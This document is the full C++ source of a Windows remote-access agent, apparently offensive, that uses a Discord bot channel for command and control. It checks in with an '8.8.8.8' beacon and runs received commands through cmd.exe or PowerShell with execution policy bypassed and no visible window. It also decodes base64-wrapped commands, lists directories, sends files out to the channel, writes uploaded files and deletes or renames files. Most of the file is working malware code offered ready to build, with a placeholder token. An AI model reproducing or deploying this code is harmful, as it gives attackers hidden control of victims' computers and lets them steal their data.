// x86_64-w64-mingw32-g++ -static -o payload_discord.exe Discord Agent.cpp -lwinhttp -lstdc++fs -lws2_32 -lgdi32 -lcrypt32 -std=c++17

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <map>
#include <chrono>
#include <thread>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <cstdlib>
#include <ctime>
#include <iomanip>
#include <memory>
#include <algorithm>
#include <cstdio>
#include <iostream>
#include <cstdint>
#include <cstring>
#include <exception>
#include <initializer_list>
#include <type_traits>
#include <utility>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")



namespace nlohmann {
    class json {
    private:
        enum class value_t {
            null, object, array, string, boolean, number_integer, number_unsigned, number_float, binary
        };

        struct storage {
            value_t type = value_t::null;
            std::string string_value;
            std::map<std::string, json> object_value;
            std::vector<json> array_value;
            bool boolean_value = false;
            int64_t number_integer_value = 0;
            uint64_t number_unsigned_value = 0;
            double number_float_value = 0.0;
        };

        std::shared_ptr<storage> data;

    public:
        json() : data(std::make_shared<storage>()) {}
        json(std::nullptr_t) : data(std::make_shared<storage>()) { data->type = value_t::null; }
        json(const std::string& s) : data(std::make_shared<storage>()) { data->type = value_t::string; data->string_value = s; }
        json(const char* s) : data(std::make_shared<storage>()) { data->type = value_t::string; data->string_value = s; }
        json(bool b) : data(std::make_shared<storage>()) { data->type = value_t::boolean; data->boolean_value = b; }
        json(int64_t i) : data(std::make_shared<storage>()) { data->type = value_t::number_integer; data->number_integer_value = i; }
        json(uint64_t u) : data(std::make_shared<storage>()) { data->type = value_t::number_unsigned; data->number_unsigned_value = u; }
        json(double d) : data(std::make_shared<storage>()) { data->type = value_t::number_float; data->number_float_value = d; }
        json(const std::map<std::string, json>& obj) : data(std::make_shared<storage>()) { data->type = value_t::object; data->object_value = obj; }
        json(const std::vector<json>& arr) : data(std::make_shared<storage>()) { data->type = value_t::array; data->array_value = arr; }
        json(std::initializer_list<json> init) : data(std::make_shared<storage>()) { data->type = value_t::array; data->array_value = init; }
        json(const json& other) : data(other.data) {}

        static json object(std::initializer_list<std::pair<const std::string, json>> init) {
            json j; j.data->type = value_t::object;
            for (const auto& p : init) j.data->object_value[p.first] = p.second;
            return j;
        }
        static json array(std::initializer_list<json> init) {
            json j; j.data->type = value_t::array; j.data->array_value = init; return j;
        }

        bool is_null() const { return data->type == value_t::null; }
        bool is_object() const { return data->type == value_t::object; }
        bool is_array() const { return data->type == value_t::array; }
        bool is_string() const { return data->type == value_t::string; }
        bool is_boolean() const { return data->type == value_t::boolean; }
        bool is_number() const { return data->type == value_t::number_integer || data->type == value_t::number_unsigned || data->type == value_t::number_float; }
        bool is_number_integer() const { return data->type == value_t::number_integer || data->type == value_t::number_unsigned; }
        bool is_number_float() const { return data->type == value_t::number_float; }

        std::string get_string() const { return data->string_value; }
        bool get_boolean() const { return data->boolean_value; }
        int64_t get_int64() const { return data->number_integer_value; }
        uint64_t get_uint64() const { return data->number_unsigned_value; }
        double get_double() const { return data->number_float_value; }

        json& operator[](const std::string& key) {
            if (data->type != value_t::object) { data->type = value_t::object; data->object_value.clear(); }
            return data->object_value[key];
        }
        const json& operator[](const std::string& key) const {
            static json null_json;
            if (data->type != value_t::object) return null_json;
            auto it = data->object_value.find(key);
            return it == data->object_value.end() ? null_json : it->second;
        }
        json& operator[](size_t index) {
            if (data->type != value_t::array) { data->type = value_t::array; data->array_value.clear(); }
            if (index >= data->array_value.size()) data->array_value.resize(index + 1);
            return data->array_value[index];
        }
        const json& operator[](size_t index) const {
            static json null_json;
            if (data->type != value_t::array || index >= data->array_value.size()) return null_json;
            return data->array_value[index];
        }

        bool contains(const std::string& key) const {
            if (data->type != value_t::object) return false;
            return data->object_value.find(key) != data->object_value.end();
        }
        size_t size() const {
            if (data->type == value_t::array) return data->array_value.size();
            if (data->type == value_t::object) return data->object_value.size();
            return 0;
        }
        void push_back(const json& value) {
            if (data->type != value_t::array) { data->type = value_t::array; data->array_value.clear(); }
            data->array_value.push_back(value);
        }

        std::vector<json>::iterator begin() { return data->array_value.begin(); }
        std::vector<json>::iterator end() { return data->array_value.end(); }
        std::vector<json>::const_iterator begin() const { return data->array_value.begin(); }
        std::vector<json>::const_iterator end() const { return data->array_value.end(); }

        std::string dump(int indent = -1) const { return serialize(*this, indent); }
        static json parse(const std::string& str) { size_t pos = 0; return parse_value(str, pos); }

    private:
        static json parse_value(const std::string& str, size_t& pos) {
            skip_whitespace(str, pos);
            if (pos >= str.length()) return json(nullptr);
            char c = str[pos];
            if (c == 'n') { if (str.substr(pos, 4) == "null") { pos += 4; return json(nullptr); } }
            else if (c == 't') { if (str.substr(pos, 4) == "true") { pos += 4; return json(true); } }
            else if (c == 'f') { if (str.substr(pos, 5) == "false") { pos += 5; return json(false); } }
            else if (c == '"') return json(parse_string(str, pos));
            else if (c == '{') {
                pos++; json obj; obj.data->type = value_t::object;
                skip_whitespace(str, pos);
                if (pos < str.length() && str[pos] == '}') { pos++; return obj; }
                while (pos < str.length()) {
                    skip_whitespace(str, pos);
                    if (str[pos] != '"') break;
                    std::string key = parse_string(str, pos);
                    skip_whitespace(str, pos);
                    if (pos >= str.length() || str[pos] != ':') break;
                    pos++;
                    json value = parse_value(str, pos);
                    obj.data->object_value[key] = value;
                    skip_whitespace(str, pos);
                    if (pos < str.length() && str[pos] == ',') { pos++; continue; }
                    else if (pos < str.length() && str[pos] == '}') { pos++; break; }
                    else break;
                }
                return obj;
            }
            else if (c == '[') {
                pos++; json arr; arr.data->type = value_t::array;
                skip_whitespace(str, pos);
                if (pos < str.length() && str[pos] == ']') { pos++; return arr; }
                while (pos < str.length()) {
                    json value = parse_value(str, pos);
                    arr.data->array_value.push_back(value);
                    skip_whitespace(str, pos);
                    if (pos < str.length() && str[pos] == ',') { pos++; continue; }
                    else if (pos < str.length() && str[pos] == ']') { pos++; break; }
                    else break;
                }
                return arr;
            }
            else if (c == '-' || (c >= '0' && c <= '9')) return parse_number(str, pos);
            return json(nullptr);
        }

        static void skip_whitespace(const std::string& str, size_t& pos) {
            while (pos < str.length() && (str[pos] == ' ' || str[pos] == '\n' || str[pos] == '\r' || str[pos] == '\t')) pos++;
        }

        static std::string parse_string(const std::string& str, size_t& pos) {
            pos++; std::string result;
            while (pos < str.length()) {
                char c = str[pos];
                if (c == '"') { pos++; break; }
                else if (c == '\\') {
                    pos++; if (pos >= str.length()) break;
                    char esc = str[pos];
                    switch (esc) {
                        case '"': result += '"'; break;
                        case '\\': result += '\\'; break;
                        case '/': result += '/'; break;
                        case 'b': result += '\b'; break;
                        case 'f': result += '\f'; break;
                        case 'n': result += '\n'; break;
                        case 'r': result += '\r'; break;
                        case 't': result += '\t'; break;
                        default: result += esc; break;
                    }
                    pos++;
                } else { result += c; pos++; }
            }
            return result;
        }

        static json parse_number(const std::string& str, size_t& pos) {
            size_t start = pos; bool is_float = false;
            if (str[pos] == '-') pos++;
            while (pos < str.length() && str[pos] >= '0' && str[pos] <= '9') pos++;
            if (pos < str.length() && str[pos] == '.') { is_float = true; pos++; while (pos < str.length() && str[pos] >= '0' && str[pos] <= '9') pos++; }
            if (pos < str.length() && (str[pos] == 'e' || str[pos] == 'E')) { is_float = true; pos++; if (pos < str.length() && (str[pos] == '+' || str[pos] == '-')) pos++; while (pos < str.length() && str[pos] >= '0' && str[pos] <= '9') pos++; }
            std::string num_str = str.substr(start, pos - start);
            if (is_float) return json(std::stod(num_str));
            else {
                try {
                    uint64_t u = std::stoull(num_str);
                    if (u <= INT64_MAX) return json(static_cast<int64_t>(u));
                    return json(u);
                } catch (...) { return json(static_cast<int64_t>(std::stoll(num_str))); }
            }
        }

        static std::string serialize(const json& j, int indent = -1, int current_indent = 0) {
            if (j.is_null()) return "null";
            else if (j.is_boolean()) return j.get_boolean() ? "true" : "false";
            else if (j.is_string()) return "\"" + escape_string(j.get_string()) + "\"";
            else if (j.is_number_integer()) {
                if (j.data->type == value_t::number_integer) return std::to_string(j.get_int64());
                else return std::to_string(j.get_uint64());
            }
            else if (j.is_number_float()) return std::to_string(j.get_double());
            else if (j.is_array()) {
                std::string result = "[";
                for (size_t i = 0; i < j.data->array_value.size(); i++) {
                    if (i > 0) result += ",";
                    if (indent >= 0) result += "\n" + std::string(current_indent + indent, ' ');
                    result += serialize(j.data->array_value[i], indent, current_indent + indent);
                }
                if (indent >= 0 && !j.data->array_value.empty()) result += "\n" + std::string(current_indent, ' ');
                result += "]";
                return result;
            }
            else if (j.is_object()) {
                std::string result = "{"; bool first = true;
                for (const auto& pair : j.data->object_value) {
                    if (!first) result += ",";
                    first = false;
                    if (indent >= 0) result += "\n" + std::string(current_indent + indent, ' ');
                    result += "\"" + escape_string(pair.first) + "\":";
                    if (indent >= 0) result += " ";
                    result += serialize(pair.second, indent, current_indent + indent);
                }
                if (indent >= 0 && !j.data->object_value.empty()) result += "\n" + std::string(current_indent, ' ');
                result += "}";
                return result;
            }
            return "null";
        }

        static std::string escape_string(const std::string& s) {
            std::string result;
            for (char c : s) {
                switch (c) {
                    case '"': result += "\\\""; break;
                    case '\\': result += "\\\\"; break;
                    case '\b': result += "\\b"; break;
                    case '\f': result += "\\f"; break;
                    case '\n': result += "\\n"; break;
                    case '\r': result += "\\r"; break;
                    case '\t': result += "\\t"; break;
                    default: result += c; break;
                }
            }
            return result;
        }
    };

    inline json parse(const std::string& s) { return json::parse(s); }
}

using json = nlohmann::json;



#define BOT_TOKEN "PUT YOUR BOT_TOKEN"
#define CHANNEL_ID "CHANNEL_ID"
#define BOT_USER_ID "XXXXXXXXXX"
#define DISCORD_API_HOST L"discord.com"
#define DISCORD_API_PATH "/api/v10"
#define MAX_MESSAGE_LENGTH 1900


struct UserMessageBuffer {
    std::string parts;
    time_t timestamp;
};

std::map<std::string, UserMessageBuffer> user_message_buffer;
std::string last_processed_id = "";


std::string base64_encode(const std::vector<unsigned char>& data) {
    static const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    for (unsigned char c : data) {
        char_array_3[i++] = c;
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; i < 4; i++) result += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; j < i + 1; j++) result += base64_chars[char_array_4[j]];
        while (i++ < 3) result += '=';
    }
    return result;
}

std::string base64_decode(const std::string& encoded) {
    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string clean_encoded;
    for (char c : encoded) {
        if (c == '\n' || c == '\r' || c == ' ') continue;
        clean_encoded += c;
    }
    std::string result;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[(unsigned char)base64_chars[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : clean_encoded) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            result.push_back((char)((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return result;
}


class DiscordHttpClient {
public:
    DiscordHttpClient() : hSession(NULL), hConnect(NULL) {}
    ~DiscordHttpClient() { Close(); }

    bool Initialize() {
        hSession = WinHttpOpen(L"DiscordBot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;
        hConnect = WinHttpConnect(hSession, DISCORD_API_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
        return hConnect != NULL;
    }

    std::string SendRequest(const std::string& method, const std::string& path,
                            const std::string& body = "", const std::string& auth = "") {
        if (!hConnect) return "";

        std::wstring wmethod(method.begin(), method.end());
        std::wstring wpath(path.begin(), path.end());

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, wmethod.c_str(), wpath.c_str(),
                                                NULL, WINHTTP_NO_REFERER,
                                                WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                WINHTTP_FLAG_SECURE);
        if (!hRequest) return "";

        std::wstring headers = L"Content-Type: application/json\r\n";
        if (!auth.empty()) {
            std::wstring wauth = L"Bot " + std::wstring(auth.begin(), auth.end());
            headers += L"Authorization: " + wauth + L"\r\n";
        }
        headers += L"User-Agent: DiscordBot (https://discord.com, 1.0)\r\n";

        LPCVOID lpBody = body.empty() ? NULL : body.c_str();
        DWORD dwBodyLen = body.empty() ? 0 : (DWORD)body.length();

        BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(),
                                         (LPVOID)lpBody, dwBodyLen, dwBodyLen, 0);
        if (!result) { WinHttpCloseHandle(hRequest); return ""; }

        if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); return ""; }

        std::string response;
        DWORD bytesRead = 0;
        char buffer[8192];
        do {
            bytesRead = 0;
            if (!WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) break;
            if (bytesRead > 0) { buffer[bytesRead] = '\0'; response += buffer; }
        } while (bytesRead > 0);

        WinHttpCloseHandle(hRequest);
        return response;
    }

    void Close() {
        if (hConnect) { WinHttpCloseHandle(hConnect); hConnect = NULL; }
        if (hSession) { WinHttpCloseHandle(hSession); hSession = NULL; }
    }

private:
    HINTERNET hSession;
    HINTERNET hConnect;
};



std::string run_command(const std::string& command) {
    bool use_powershell = (command.length() >= 2 && command.substr(0, 2) == "EP");
    std::string cmd_to_execute = use_powershell ? command.substr(2) : command;
    
    if (use_powershell) {
        cmd_to_execute.erase(0, cmd_to_execute.find_first_not_of(" \t\r\n"));
        cmd_to_execute.erase(cmd_to_execute.find_last_not_of(" \t\r\n") + 1);
    }
    
    if (use_powershell && cmd_to_execute.empty()) {
        return "Empty or invalid PowerShell command";
    }
    
    if (use_powershell) {
        std::string escaped_cmd;
        for (char c : cmd_to_execute) {
            if (c == '"') escaped_cmd += "\\\"";
            else escaped_cmd += c;
        }
        cmd_to_execute = escaped_cmd;
    }
    
    std::string full_command = use_powershell
        ? "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"" + cmd_to_execute + "\""
        : "cmd.exe /c " + cmd_to_execute;
    
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        return "Failed to create pipe";
    }
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
    
    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;
    
    std::vector<char> cmd_line(full_command.begin(), full_command.end());
    cmd_line.push_back('\0');
    
    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);
    
    if (!success) {
        CloseHandle(hStdoutRd);
        DWORD error = GetLastError();
        return "Failed to create process: " + std::to_string(error);
    }
    
    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);
    
    return result;
}


json browse_directory(const std::string& path) {
    json result;
    try {
        std::string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) actual_path = std::string(home) + actual_path.substr(1);
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = nullptr;
            result["items"] = json::array({});
            return result;
        }

        json items = json::array({});
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                json item;
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : entry.file_size();
                
                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() + 
                        std::chrono::system_clock::now()
                    )
                );
                std::stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();
                items.push_back(item);
            } catch (const std::exception&) { continue; }
        }

        result["success"] = true;
        result["current_path"] = actual_path;
        
        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = nullptr;
        } else if (parent.empty()) {
            result["parent_path"] = nullptr;
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = nullptr;
        result["items"] = json::array({});
    }
    return result;
}

std::string download_file(const std::string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) return "ERROR: File not found: " + filepath;
        std::ifstream file(filepath, std::ios::binary);
        if (!file) return "ERROR: Cannot open file: " + filepath;
        std::vector<unsigned char> file_data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        std::string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        std::string encoded = base64_encode(file_data);
        return "file-data:" + filename + "|" + std::to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) { return "ERROR: " + std::string(e.what()); }
}

std::string upload_file(const std::string& filepath, const std::string& filedata_b64) {
    try {
        std::string decoded_data = base64_decode(filedata_b64);
        std::vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());
        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());
        std::ofstream file(filepath, std::ios::binary);
        if (!file) return "ERROR: Cannot write file: " + filepath;
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();
        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) { return "ERROR: " + std::string(e.what()); }
}

std::string delete_file(const std::string& filepath) {
    try {
        if (std::filesystem::is_directory(filepath)) std::filesystem::remove(filepath);
        else std::filesystem::remove(filepath);
        return "SUCCESS: Deleted " + filepath;
    } catch (const std::exception& e) { return "ERROR: " + std::string(e.what()); }
}

std::string rename_file(const std::string& old_path, const std::string& new_path) {
    try {
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) { return "ERROR: " + std::string(e.what()); }
}

std::string execute_command(const std::string& cmd) {
    std::string command = cmd;
    while (!command.empty() && command.back() == ' ') command.pop_back();
    
    std::cout << "[DEBUG] execute_command received length: " << command.length() << " characters" << std::endl;
    
    if (command.empty()) {
        return "[no command received]";
    }

    if (command.find("browse:") == 0) {
        std::cout << "[DEBUG] Executing browse command" << std::endl;
        std::string browse_path = command.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) browse_path = std::filesystem::current_path().string();
        json dir_data = browse_directory(browse_path);
        std::string json_str = dir_data.dump();
        std::vector<unsigned char> json_bytes(json_str.begin(), json_str.end());
        std::string base64_data = base64_encode(json_bytes);
        return "browse-data-" + base64_data;
    }

    if (command.find("download-file:") == 0) {
        std::cout << "[DEBUG] Executing download-file command" << std::endl;
        std::string filepath = command.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return download_file(filepath);
    }

    if (command.find("upload-file:") == 0) {
        std::cout << "[DEBUG] Executing upload-file command" << std::endl;
        std::string rest = command.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != std::string::npos) {
            std::string filepath = rest.substr(0, sep_pos);
            std::string filedata_b64 = rest.substr(sep_pos + 1);
            return upload_file(filepath, filedata_b64);
        } else {
            return "ERROR: Invalid upload format";
        }
    }

    if (command.find("delete-file:") == 0) {
        std::cout << "[DEBUG] Executing delete-file command" << std::endl;
        std::string filepath = command.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return delete_file(filepath);
    }

    if (command.find("rename-file:") == 0) {
        std::cout << "[DEBUG] Executing rename-file command" << std::endl;
        std::string rest = command.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != std::string::npos) {
            std::string old_path = rest.substr(0, sep_pos);
            std::string new_path = rest.substr(sep_pos + 1);
            return rename_file(old_path, new_path);
        } else {
            return "ERROR: Invalid rename format";
        }
    }

    return run_command(command);
}


std::string decode_base64_command(const std::string& raw_message) {
    try {
        std::cout << "[DEBUG] Raw message length: " << raw_message.length() << " characters" << std::endl;
        
        if (raw_message.find("[B64]") == 0) {
            std::string b64_part = raw_message.substr(5);
            std::cout << "[DEBUG] Base64 part length: " << b64_part.length() << " characters" << std::endl;
            
            std::string decoded = base64_decode(b64_part);
            
            std::cout << "[DEBUG] Decoded command length: " << decoded.length() << " characters" << std::endl;
            
            if (decoded.length() >= 2) {
                std::cout << "[DEBUG] Decoded starts with: " << decoded.substr(0, std::min((size_t)20, decoded.length())) << "..." << std::endl;
            }
            
            return decoded;
        }
        return raw_message;
    } catch (const std::exception& e) {
        std::cout << "[DEBUG] Error in decode_base64_command: " << e.what() << std::endl;
        return raw_message;
    }
}


std::vector<std::string> split_output(const std::string& output) {
    std::vector<std::string> parts;
    if (output.length() <= MAX_MESSAGE_LENGTH) {
        parts.push_back(output);
        return parts;
    }
    
    size_t start = 0;
    while (start < output.length()) {
        size_t end = start + MAX_MESSAGE_LENGTH;
        if (end < output.length()) {
            size_t newline_pos = output.rfind('\n', end);
            if (newline_pos > start && newline_pos != std::string::npos) {
                end = newline_pos + 1;
            }
        }
        parts.push_back(output.substr(start, end - start));
        start = end;
    }
    return parts;
}


std::string escape_json(const std::string& s) {
    std::string result;
    for (char c : s) {
        switch (c) {
            case '"': result += "\\\""; break;
            case '\\': result += "\\\\"; break;
            case '\n': result += "\\n"; break;
            case '\r': result += "\\r"; break;
            case '\t': result += "\\t"; break;
            default: result += c; break;
        }
    }
    return result;
}

bool send_discord_message(const std::string& content) {
    DiscordHttpClient client;
    if (!client.Initialize()) return false;

    std::string json_body = "{\"content\":\"" + escape_json(content) + "\"}";
    std::string path = std::string(DISCORD_API_PATH) + "/channels/" + CHANNEL_ID + "/messages";
    std::string response = client.SendRequest("POST", path, json_body, BOT_TOKEN);

    return !response.empty();
}


void process_message(const json& message) {
    try {
        if (!message.contains("content")) {
            std::cout << "[DEBUG] process_message: no content" << std::endl;
            return;
        }
        if (!message.contains("id")) {
            std::cout << "[DEBUG] process_message: no id" << std::endl;
            return;
        }
        if (!message.contains("author")) {
            std::cout << "[DEBUG] process_message: no author" << std::endl;
            return;
        }
        if (!message["author"].contains("id")) {
            std::cout << "[DEBUG] process_message: no author id" << std::endl;
            return;
        }

        std::string msg_id = message["id"].get_string();
        std::string text = message["content"].get_string();
        std::string author_id = message["author"]["id"].get_string();


        if (author_id == BOT_USER_ID) {
            std::cout << "[DEBUG] Skipping bot's own message (ID: " << msg_id << ")" << std::endl;
            return;
        }


        while (!text.empty() && text.back() == ' ') text.pop_back();
        

        if (text.find("8.8.8.8") != std::string::npos) {
            std::cout << "[DEBUG] Received 8.8.8.8, ignoring..." << std::endl;
            return;
        }
        
        if (text == "exit" || text == "quit") {
            send_discord_message("Shutting down...");
            std::cout << "Shutting down by user command..." << std::endl;
            exit(0);
        }

        if (text.length() >= 4 && text.substr(text.length() - 4) == "-end") {
            std::string clean_part = text.substr(0, text.length() - 4);
            
            std::string full_command;
            if (user_message_buffer.find(author_id) != user_message_buffer.end()) {
                full_command = user_message_buffer[author_id].parts + clean_part;
                user_message_buffer.erase(author_id);
            } else {
                full_command = clean_part;
            }

            while (!full_command.empty() && full_command.front() == ' ') full_command.erase(0, 1);
            while (!full_command.empty() && full_command.back() == ' ') full_command.pop_back();

            std::cout << "[DEBUG] Full command before decode length: " << full_command.length() << " characters" << std::endl;

            std::string decoded_cmd = decode_base64_command(full_command);
            if (!decoded_cmd.empty()) {
                full_command = decoded_cmd;
            }

            std::cout << "[DEBUG] Full command after decode length: " << full_command.length() << " characters" << std::endl;


            if (full_command.find("8.8.8.8") != std::string::npos) {
                std::cout << "[DEBUG] Ignoring command containing 8.8.8.8" << std::endl;
                return;
            }

            std::string result = execute_command(full_command);
            std::vector<std::string> parts = split_output(result);
            
            for (size_t i = 0; i < parts.size(); i++) {
                std::string part = parts[i];
                if (i == parts.size() - 1) {
                    part += "-end";
                }
                send_discord_message("```\n" + part + "\n```");
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
            return;
        }

        if (user_message_buffer.find(author_id) == user_message_buffer.end()) {
            user_message_buffer[author_id] = {"", time(nullptr)};
        }
        user_message_buffer[author_id].parts += text;
        user_message_buffer[author_id].timestamp = time(nullptr);
        
    } catch (const std::exception& e) {
        std::cerr << "Error processing message: " << e.what() << std::endl;
    }
}


json get_messages(const std::string& after_id = "") {
    DiscordHttpClient client;
    if (!client.Initialize()) return json();

    std::string path = std::string(DISCORD_API_PATH) + "/channels/" + CHANNEL_ID + "/messages?limit=10";
    if (!after_id.empty()) {
        path += "&after=" + after_id;
    }
    std::string response = client.SendRequest("GET", path, "", BOT_TOKEN);

    if (response.empty()) return json();

    try {
        return json::parse(response);
    } catch (const std::exception&) {
        return json();
    }
}


int main() {
    std::cout << "Bot running..." << std::endl;
    

    std::cout << "[*] Fetching latest message to set starting point..." << std::endl;
    json init_messages = get_messages();
    if (init_messages.is_array() && init_messages.size() > 0) {

        std::string latest_id = init_messages[0]["id"].get_string();
        last_processed_id = latest_id;
        std::cout << "[*] Starting point set to message ID: " << last_processed_id << std::endl;
        std::cout << "[*] All messages before this will be ignored" << std::endl;
    } else {
        std::cout << "[*] No messages found, starting fresh..." << std::endl;
        last_processed_id = "";
    }
    

    std::cout << "[*] Sending 8.8.8.8..." << std::endl;
    send_discord_message("8.8.8.8");
    
    std::cout << "[*] Waiting for new commands only..." << std::endl;
    
    while (true) {

        json messages = get_messages(last_processed_id);
        
        if (messages.is_array() && messages.size() > 0) {
            std::cout << "[DEBUG] Got " << messages.size() << " new messages" << std::endl;
            

            for (int i = messages.size() - 1; i >= 0; i--) {
                const auto& msg = messages[i];
                
                if (!msg.contains("id") || !msg.contains("content")) continue;
                
                std::string msg_id = msg["id"].get_string();
                

                bool is_bot_message = false;
                if (msg.contains("author") && msg["author"].contains("id")) {
                    std::string author_id = msg["author"]["id"].get_string();
                    if (author_id == BOT_USER_ID) {
                        is_bot_message = true;
                        std::cout << "[DEBUG] Skipping bot's own message (ID: " << msg_id << ")" << std::endl;
                    }
                }
                

                if (is_bot_message) {
                    if (last_processed_id.empty() || msg_id > last_processed_id) {
                        last_processed_id = msg_id;
                    }
                    continue;
                }
                

                process_message(msg);
                

                if (last_processed_id.empty() || msg_id > last_processed_id) {
                    last_processed_id = msg_id;
                }
            }
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    return 0;
}
